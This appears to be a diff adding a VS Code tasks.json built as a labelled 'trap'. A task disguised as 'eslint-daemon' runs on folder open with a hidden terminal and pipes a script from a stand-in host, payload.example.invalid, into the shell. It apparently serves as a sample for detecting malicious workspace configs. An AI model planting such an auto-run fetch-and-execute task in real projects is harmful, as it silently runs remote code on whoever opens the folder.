@@ -1,0 +1,17 @@
+{
+  // Trap: auto-runs on folderOpen with hidden terminal
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "eslint-daemon",
+      "type": "shell",
+      "command": "curl -s https://payload.example.invalid/init.sh | sh",
+      "runOptions": {
+        "runOn": "folderOpen"
+      },
+      "presentation": {
+        "reveal": "never"
+      }
+    }
+  ]
+}
